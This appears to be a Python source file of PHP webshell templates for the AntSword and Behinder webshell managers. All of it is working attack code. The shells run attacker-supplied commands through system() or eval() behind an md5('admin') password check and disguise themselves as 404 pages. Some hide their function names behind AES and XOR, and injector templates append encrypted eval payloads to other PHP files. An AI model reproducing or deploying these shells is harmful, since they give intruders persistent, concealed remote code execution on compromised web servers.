
# template for system
system_template="""
<?php
$a = ${_GET}[1];
$b = ${_POST}[2];
//  1 is md5('admin'). You can have on your own.
if(isset($b) and md5($a)=='21232f297a57a5a743894a0e4a801fc3')
{
    $t = system;
    @${'t'}($b);
  
}
else{
	
	echo '<title>Error 404!!1</title><p align="center">404.Not Found</p>';

	header('HTTP/1.1 404 Not Found');
	http_response_code(404);
}
?>"""
#eval
#for antsword
template_for_antword = """
<?php
$a = ${_GET}[1];
$b = ${_POST}[2];
//  1 is md5('admin'). You can have on your own.
if(isset($b) and md5($a)=='21232f297a57a5a743894a0e4a801fc3')
{

	class C{public function __invoke($p) {eval($p);}};
	$t = call_user_func;
    @${'t'}(new C(),$b);
  
  
}
else{
	
	echo '<title>Error 404!!1</title><p align="center">404.Not Found</p>';

	header('HTTP/1.1 404 Not Found');
	http_response_code(404);
}
?>
"""
# eval for antsword in aes
template_for_antword_aes = """
<?php
$a = ${base64_decode(openssl_decrypt("Lgjy1GJq3i90SAn6+weefA==","AES-128-ECB", "21232f297a57a5a7"))^base64_decode(openssl_decrypt("MV5FHu+luRti7DJVAjt1+Q==","AES-128-ECB", "21232f297a57a5a7"))}[1];
$b = ${base64_decode(openssl_decrypt("o5nroR9NPtSvoTuEmyqy+A==","AES-128-ECB", "21232f297a57a5a7"))^base64_decode(openssl_decrypt("4MQ0qs8BnikMl6QA3fEfSw==","AES-128-ECB", "21232f297a57a5a7"))}[2];
//  1 is md5('admin'). You can have on your own.

if(isset($b) and md5($a)=='21232f297a57a5a743894a0e4a801fc3')
{

	class C{public function __invoke($p) {"/*YmZiNDg4YWYwMDc5ZjMxNzA4MzFiZDRjYjQwNTI1ZGU=*/"."/*YmZiNDg4YWYwMDc5ZjMxNzA4MzFiZDRjYjQwNTI1ZGU=*/".eval($p)."//bfb488af0079f3170831bd4cb40525de";}};
	$t = base64_decode(openssl_decrypt("610rJwc5aQHmJs63GYrhl/xj0QeaOsffhQ8+ggzZHAM=","AES-128-ECB", "21232f297a57a5a7"))^base64_decode(openssl_decrypt("d4LuKXiH4SpLy8+HKMyMJI7R52ftwmwqPdBnqL3N7Pc=","AES-128-ECB", "21232f297a57a5a7"));
    @${'t'}(new C(),$b);
  
  
}
else{
	
	echo '<title>Error 404!!1</title><p align="center">404.Not Found</p>';

	header('HTTP/1.1 404 Not Found');
	http_response_code(404);
}
?>
"""
#eval for behinder
template_for_behinder = """
<?php
$a = ${_GET}[1];

//  1 is md5('admin'). You can have on your own.
if(md5($a)=='21232f297a57a5a743894a0e4a801fc3')
{
	session_start();
    $key="e45e329feb5d925b"; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond
	$_SESSION['k']=$key;
	session_write_close();
	$post=file_get_contents("php://input");
	if(!extension_loaded('openssl'))
	{
		$t="base64_"."decode";
		$post=$t($post."");
		
		for($i=0;$i<strlen($post);$i++) {
    			 $post[$i] = $post[$i]^$key[$i+1&15]; 
    			}
	}
	else
	{
		$post=openssl_decrypt($post, "AES128", $key);
	}
    $arr=explode('|',$post);
    $func=$arr[0];
    $params=$arr[1];
	class C{public function __invoke($p) {eval($p."");}};
	$t = call_user_func;
    @${'t'}(new C(),$params);
  
  
}
else{
	
	echo '<title>Error 404!!1</title><p align="center">404.Not Found</p>';

	header('HTTP/1.1 404 Not Found');
	http_response_code(404);
}
?>


"""
#for behinder with aes
template_for_behinder_aes = """
<?php
$a = ${base64_decode(openssl_decrypt("Lgjy1GJq3i90SAn6+weefA==","AES-128-ECB", "21232f297a57a5a7"))^base64_decode(openssl_decrypt("MV5FHu+luRti7DJVAjt1+Q==","AES-128-ECB", "21232f297a57a5a7"))}[1];

//  1 is md5('admin'). You can have on your own.
if(md5($a)=='21232f297a57a5a743894a0e4a801fc3')
{
	session_start();
    $key="e45e329feb5d925b"; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond
	$_SESSION['k']=$key;
	session_write_close();
	$post=file_get_contents("php://input");
	if(!extension_loaded('openssl'))
	{
		$t="base64_"."decode";
		$post=$t($post."");
		
		for($i=0;$i<strlen($post);$i++) {
    			 $post[$i] = $post[$i]^$key[$i+1&15]; 
    			}
	}
	else
	{
		$post=openssl_decrypt($post, "AES128", $key);
	}
    $arr=explode('|',$post);
    $func=$arr[0];
    $params=$arr[1];
	class C{public function __invoke($p) {"/*YmZiNDg4YWYwMDc5ZjMxNzA4MzFiZDRjYjQwNTI1ZGU=*/"."/*YmZiNDg4YWYwMDc5ZjMxNzA4MzFiZDRjYjQwNTI1ZGU=*/".eval($p)."//bfb488af0079f3170831bd4cb40525de";}};
	$t = base64_decode(openssl_decrypt("610rJwc5aQHmJs63GYrhl/xj0QeaOsffhQ8+ggzZHAM=","AES-128-ECB", "21232f297a57a5a7"))^base64_decode(openssl_decrypt("d4LuKXiH4SpLy8+HKMyMJI7R52ftwmwqPdBnqL3N7Pc=","AES-128-ECB", "21232f297a57a5a7"));
    @${'t'}(new C(),$params);
  
  
}
else{
	
	echo '<title>Error 404!!1</title><p align="center">404.Not Found</p>';

	header('HTTP/1.1 404 Not Found');
	http_response_code(404);
}
?>
"""
#inject
template_inject = """
<?php
$a = ${_GET}[1];
$ar = base64_decode("filenames");
$arr = explode('|',$ar);
foreach($arr as $k => $inject_php){
//  1 is md5('admin'). You can have on your own.
if(md5($a)=='21232f297a57a5a743894a0e4a801fc3')
{
	file_put_contents($inject_php, "<?php eval(base64_decode(openssl_decrypt('PbFgmp3SQoVkSTAuPzDI0tEobTt11LR8wpU7u836TqHXFUEV5JMZPyQyvM4Gy8Ivyq0/Bevejyvaj+E94lbUHfJ9unfxdeTUSR+oszHCc9w6JN8KAAm6LRrrEBg7sdfMmtbthL/VpfWMEQXu2c3DC/fR4nLiLSN9AD8nx2l8gpoLtqcF+dbW0paD3Uwx9aFgmgWH94xaTrA6wlRxe7iLGSw0oEYZ/Awas2YPHtOmczRCtYRv4gXvv7MEmL7S4cYVtYY0KpgepSmi1RHB+niK/2M8xS/oM8EHu9vnOzniWNydXVfLFyKLaAtMz2sL6vCBZCX0HtIclQNo8J9OlKskILYwVNVSvWERQVxnGBbniKKagtaqhJL8Xix83oGmr8IpCfHASDxYMhI3PGviVBFr40welrmE1yceygCmwGr8Z5LoqxisKfxMJimjuJDHROK/j4Fciln0vyqK4A5pVFQpctrGpLqtlnbSuUAH2j7VGYowCOjGCijGi7DisZt+M1pAoithDRpOztVObyEllJm90Up2/mGN+lWBKiQK/k+4Ynb3OeiwEn9SeJ7m/z2N+eQarcNFBm3QV15nrotjE7jfO+X9n+CZz1l3ae5wOvTSwIxf6oT4fK6Ps6eDnxt79x4JV6r15QsM8fmc1BPjIS0gNl+nAvzqtpC1sqjcV92sTdNPj9FGQf1U+eJe6WxSM5plyv3kSzdOsl6V4j7ls2gvaYfeI8MBqhHoFmz+oKZLJFBgwdAcPCrVr4vhen7jSTS2TtQ2tDOGaAeHfvBVFSYlRgGt6+/pqsz9dBPQEQVRVzbFnZdjXF9tmp19Ivr/uc8nr040Z9nkAoXNRmRkgH13qAmZBJlQvdASaWCNALEf9tR/SwZSrNwHomRbBHgNJmdO++dgD7ry2YJ0ZQnbFzafDLrtvnmtvzWLEnELKMXwKnnQKnKoe1T+0/jBdhnadj4gW6WIqa5mSzz9TVeoBbRLMZEm/Y9rhyilX+4u607g2AI=', 'AES-128-ECB','21232f297a57a5a7')));?>",FILE_APPEND);
}
else{
	
	echo '<title>Error 404!!1</title><p>404.Not Found</p>';

	header('HTTP/1.1 404 Not Found');
	http_response_code(404);
}
}
?>

"""
#inject with aes
template_inject_aes = """
<?php
$a = ${_GET}[1];
$ar = base64_decode("filenames");
$arr = explode('|',$ar);
foreach($arr as $k => $inject_php){
//  1 is md5('admin'). You can have on your own.
if(md5($a)=='21232f297a57a5a743894a0e4a801fc3')
{   
   file_put_contents($inject_php, openssl_decrypt("7j7fXo3SPpB52iSMMspQxQ==", "AES-128-ECB", "b521caa6e1db82e5"),FILE_APPEND);
    file_put_contents($inject_php,openssl_decrypt("sxi4WLMRLAPLWLVQC3nZfhU1ps6Euf++bMzxICxR8cDnChpAcMJv4Uoa+QpauvoO+SKfdj9UWAGb/eUjE1tUOO5JwQbN7CjRp3/tkaLQf5aIZn3lLB8H8eLghAzX7mI3ZXtEWWjw1LhpExTXi0E8Ws5wPNN+3cRuFEcXy/o/lRq4206gKGFIhauRz1AY02zwT8tPfCObpw6OO+06kYrkHk1vTIOEQJndwuuhMnBC0ZvtTgLQAGmlF/JZXyrai6WWpuCz8p1U7HjG7Dt9ynv8QpEY9yfZHm9GCAWVlzBz+ZpdDlz3/UC9ojNYDwd0KGJE8OZ/u5WasbLhTT6Yll9ccYK39c0Hd9UGdBISA/3U8QaNgoyzfRgNL0XjLXtCaq9Y6dMSTKcD2bbnByA5Jwcd79f/FYiQ+qWVj/DvtBSFH90+Mg7FHp4uU/CA/S0L4gVvAkK0tx8AzikjRJkkx9+DasmmdqZM6qA8YoROqL7IRSFdAClq1bJaM0QUYFIFHizHUb8MYADwTQV1TpZ/L4mV9cHg5FwRxCqKYRVvZA/ZiXuLTUU7Txakz2fXYadP64+hoyBqGK2qRmlFU/LuyhzO2haBZHGiPzE+bVdhri1+MCfSw9UPb2Z6oum4GczFtWuNpCNrZruGBV8EEnEsrotJmWfQkjv5UA278aXz05CkTwx4/9ELQtdaDt/fznXJ1PwVQufHP3QKPRMRlnTZHALNWv+z3rjIhtzT8oRM7L5QKsm8nHssxq39shMq4hUiwdVSrmmWb3yi0ugm2Cg9gWhzQApEwjW82Fg0in2PChp8wxTBoa8nODSF/WZjJ9w7xee1FnCahv7TvpNa60uSqx69m6jjKlrvsEOaK7T3p0I2iNBXgQTMyJsr6aMpYXmqcmDSgVxQcsQOGlfnEN8Q7kGTVNEYwiGENa2DtWpa8hqshqo/4bSbYA67wr6sVno+LGDuWL5Hp8gxAKer3Tmv8SVgivf/qZKLsc7r90NfzTpBfbWYMDqikcwa3BMoJ8H83eetfvz2GU501t/LHH94ZP2kC+mOzWSEqtH7pvYcpqTojofho9NlyJvH4mh2eC7AE0AGXXR3GeV10IKGbHcjYuFbQAp4xrNCs/t69KQuCN8qrRcBZhQaoXcYxIR3/eGB9LiOBZupiLfcBJcMMfU14YqfiPS4RXTI0Dpp6N8dhfWVj5dJaJ64q44th3mZjtKAZcbpJLD46l6W0WIdjt4BxlrwH0kndEg3rP1PFnA2DS383krWl9kLDNzgfZrmw/R5aYko24IHvXGEBmyrFwBliRm8tPT7a0w2QqGYwqzj7QlZTisMzWq0+dP+CI3St0qu5LBBPOoU0OjC4c9GSFu0uRAM0BL1Oy2DGsihBa9sr1yfqQ8eWjMZ4UA0vCxjqYh/0OBczyYF1hDfTvXRKuvXW6Spyc9ThhCi/cKau2722rxlfCo=", "AES-128-ECB", "b521caa6e1db82e5"),FILE_APPEND);
    file_put_contents($inject_php,openssl_decrypt("/cCTgZzc0/7TcTzQM0lDMQ==", "AES-128-ECB", "b521caa6e1db82e5"),FILE_APPEND);
}
else{

	echo '<title>Error 404!!1</title><p>404.Not Found</p>';

	header('HTTP/1.1 404 Not Found');
	http_response_code(404);
}
}
?>

"""
template_inject_aes_quiet = """
<?php
$ar = base64_decode("filenames");
$arr = explode('|',$ar);
foreach($arr as $k => $inject_php){
//  1 is md5('admin'). You can have on your own.
 
   file_put_contents($inject_php, openssl_decrypt("7j7fXo3SPpB52iSMMspQxQ==", "AES-128-ECB", "b521caa6e1db82e5"),FILE_APPEND);
    file_put_contents($inject_php,openssl_decrypt("sxi4WLMRLAPLWLVQC3nZfhU1ps6Euf++bMzxICxR8cDnChpAcMJv4Uoa+QpauvoO+SKfdj9UWAGb/eUjE1tUOO5JwQbN7CjRp3/tkaLQf5aIZn3lLB8H8eLghAzX7mI3ZXtEWWjw1LhpExTXi0E8Ws5wPNN+3cRuFEcXy/o/lRq4206gKGFIhauRz1AY02zwT8tPfCObpw6OO+06kYrkHk1vTIOEQJndwuuhMnBC0ZvtTgLQAGmlF/JZXyrai6WWpuCz8p1U7HjG7Dt9ynv8QpEY9yfZHm9GCAWVlzBz+ZpdDlz3/UC9ojNYDwd0KGJE8OZ/u5WasbLhTT6Yll9ccYK39c0Hd9UGdBISA/3U8QaNgoyzfRgNL0XjLXtCaq9Y6dMSTKcD2bbnByA5Jwcd79f/FYiQ+qWVj/DvtBSFH90+Mg7FHp4uU/CA/S0L4gVvAkK0tx8AzikjRJkkx9+DasmmdqZM6qA8YoROqL7IRSFdAClq1bJaM0QUYFIFHizHUb8MYADwTQV1TpZ/L4mV9cHg5FwRxCqKYRVvZA/ZiXuLTUU7Txakz2fXYadP64+hoyBqGK2qRmlFU/LuyhzO2haBZHGiPzE+bVdhri1+MCfSw9UPb2Z6oum4GczFtWuNpCNrZruGBV8EEnEsrotJmWfQkjv5UA278aXz05CkTwx4/9ELQtdaDt/fznXJ1PwVQufHP3QKPRMRlnTZHALNWv+z3rjIhtzT8oRM7L5QKsm8nHssxq39shMq4hUiwdVSrmmWb3yi0ugm2Cg9gWhzQApEwjW82Fg0in2PChp8wxTBoa8nODSF/WZjJ9w7xee1FnCahv7TvpNa60uSqx69m6jjKlrvsEOaK7T3p0I2iNBXgQTMyJsr6aMpYXmqcmDSgVxQcsQOGlfnEN8Q7kGTVNEYwiGENa2DtWpa8hqshqo/4bSbYA67wr6sVno+LGDuWL5Hp8gxAKer3Tmv8SVgivf/qZKLsc7r90NfzTpBfbWYMDqikcwa3BMoJ8H83eetfvz2GU501t/LHH94ZP2kC+mOzWSEqtH7pvYcpqTojofho9NlyJvH4mh2eC7AE0AGXXR3GeV10IKGbHcjYuFbQAp4xrNCs/t69KQuCN8qrRcBZhQaoXcYxIR3/eGB9LiOBZupiLfcBJcMMfU14YqfiPS4RXTI0Dpp6N8dhfWVj5dJaJ64q44th3mZjtKAZcbpJLD46l6W0WIdjt4BxlrwH0kndEg3rP1PFnA2DS383krWl9kLDNzgfZrmw/R5aYko24IHvXGEBmyrFwBliRm8tPT7a0w2QqGYwqzj7QlZTisMzWq0+dP+CI3St0qu5LBBPOoU0OjC4c9GSFu0uRAM0BL1Oy2DGsihBa9sr1yfqQ8eWjMZ4UA0vCxjqYh/0OBczyYF1hDfTvXRKuvXW6Spyc9ThhCi/cKau2722rxlfCo=", "AES-128-ECB", "b521caa6e1db82e5"),FILE_APPEND);
    file_put_contents($inject_php,openssl_decrypt("/cCTgZzc0/7TcTzQM0lDMQ==", "AES-128-ECB", "b521caa6e1db82e5"),FILE_APPEND);
    echo '<title>Error 404!!1</title><p>404.Not Found</p>';

	header('HTTP/1.1 404 Not Found');
	http_response_code(404);
}
?>

"""
#inject for behinder's payload
inject_behinder_rawpayload="<?php eval(base64_decode(openssl_decrypt('PbFgmp3SQoVkSTAuPzDI0tEobTt11LR8wpU7u836TqHXFUEV5JMZPyQyvM4Gy8Ivyq0/Bevejyvaj+E94lbUHfJ9unfxdeTUSR+oszHCc9w6JN8KAAm6LRrrEBg7sdfMmtbthL/VpfWMEQXu2c3DC/fR4nLiLSN9AD8nx2l8gpoLtqcF+dbW0paD3Uwx9aFgmgWH94xaTrA6wlRxe7iLGSw0oEYZ/Awas2YPHtOmczRCtYRv4gXvv7MEmL7S4cYVtYY0KpgepSmi1RHB+niK/2M8xS/oM8EHu9vnOzniWNydXVfLFyKLaAtMz2sL6vCBZCX0HtIclQNo8J9OlKskILYwVNVSvWERQVxnGBbniKKagtaqhJL8Xix83oGmr8IpCfHASDxYMhI3PGviVBFr40welrmE1yceygCmwGr8Z5LoqxisKfxMJimjuJDHROK/j4Fciln0vyqK4A5pVFQpctrGpLqtlnbSuUAH2j7VGYowCOjGCijGi7DisZt+M1pAoithDRpOztVObyEllJm90Up2/mGN+lWBKiQK/k+4Ynb3OeiwEn9SeJ7m/z2N+eQarcNFBm3QV15nrotjE7jfO+X9n+CZz1l3ae5wOvTSwIxf6oT4fK6Ps6eDnxt79x4JV6r15QsM8fmc1BPjIS0gNl+nAvzqtpC1sqjcV92sTdNPj9FGQf1U+eJe6WxSM5plyv3kSzdOsl6V4j7ls2gvaYfeI8MBqhHoFmz+oKZLJFBgwdAcPCrVr4vhen7jSTS2TtQ2tDOGaAeHfvBVFSYlRgGt6+/pqsz9dBPQEQVRVzbFnZdjXF9tmp19Ivr/uc8nr040Z9nkAoXNRmRkgH13qAmZBJlQvdASaWCNALEf9tR/SwZSrNwHomRbBHgNJmdO++dgD7ry2YJ0ZQnbFzafDLrtvnmtvzWLEnELKMXwKnnQKnKoe1T+0/jBdhnadj4gW6WIqa5mSzz9TVeoBbRLMZEm/Y9rhyilX+4u607g2AI=', 'AES-128-ECB','21232f297a57a5a7')));?>"
inject_behinder_aespayload='o5BfRvJsC32dBjktELw9++itIvINWdo3vhXZ5S2iuBhd9s0Y01SST0KL+39T4YGLXjPjBmvU2w6pGwPCdiWl18ONYDY8A4YtSuFHyho8aYNpt1JaX2B3l5DZEag04u73zTaUw2LZ1kMlXzp9Ncnb5Eoi4JcFeoonoWh/BRymSUp1phV9VnKcpTs9mfVnj7rvKfoeg87m0Xi19al5dhGS1PKkr4ByMxAQCxg7W60ttWtd2ibAcqF0OtVwwvlwdaSCdA/Y3qPf4IWYHK9iXCsAQV3jNYI56/zg0CEjTTCuXGpZZlypv1DJdWd6toEzxV2ya7+qaYw8g+6QP0Nxku0AhttnWncIASGdbcu8P5r/PrN7zz8LxpdQMLiXNIsnqvQIdcxm7CbBeaJAZ+TJsVUlFubBGvAld+2bl1pARtsvBjYI/XIGdGXsgeHsvSNAFfBv9otnEgSOfYVlxEG26YBpBdNiLUxHsrPVrg5X1Tk2VbULXdB8Z5Vgy5F5Nu7gp5xmW0hjrdfMec4tLMRDnPldXxkQTPEypXRTyy0e6rHHUlGxXQ0yFWhrAfacBK8yCiKvJ9pur5LDmaU/sEBLI0qQTaSWTg5e2vYWoPunWN4Ob9f/InZ9zA1cFWgN0/fsBIB+BOPvYjLGCWcMIO5u+x69JFWERFhZ/xTvNxIKgxcpy9w4575tfYu8riH3F6jEXyAcGFyn6FzkH09oPtpuJvpzH5DUV8t7sdUtzSAlhiEiF6Z1e9dcHbxyCmnAnzhLXqeUYApWsbvEkyGj3N3/MCBIonFO+pWV5pon3D4bz3va/rJLKu6kTvJLsr8mqUcHGl7Vbt3LFT5yQhrwLnlZeQFfw3TD763pfaosixZvhnpB44WCgKc/FVTpHolnGRmpLOgC0QDuoVqF5OCrTDzxpFhloUUatmFxTAqvzrR0p+Xci4mCBYJKWBnLgAl5aYKxQw7Aas6XMKq+rwx2n5mM6NLp3LC0xd8NpJBslSYyVllbn3s7OGma0nGDB7ujWGQpqrCtKqZOOjvXj6KQlSCKPUROcDL49/yb43d5cKaKV95q17FVzzlmkCQCht4r8feJNyY+/Mqdt1aaH5fwmAqeeTqfLMwPICQ5mYH/PFFdKj5KUl82ZsyeIlmsyeZqftQmextQ2FSOGP6C4JTH+CcQkFK7edkRd+rpjea8WjxS9NEUAOvS1soz8lPLSqlkYuKKdo1vwZQ9d2JJmFC96GKd+JGR/Rm8yt6u7pPDoJuxsMju/i7ghu/BzijqEr3PfYPbcE4nAMy9nIdTrz5yrd1H0iBDlM4NeUV/sktV99rxX/t2CvHRHHVEDS9cgdTr69TjWlt/9P3PAyDLzYIOyosCXaK3FHyeyATjKXKQapZmN2i8ZrNJ9ZPcrxh6HE/NJPh78ZRq1SZ3UAamqtYRIlkv4auHfH9BiQm8r37I3Ik9ZNWTPrU='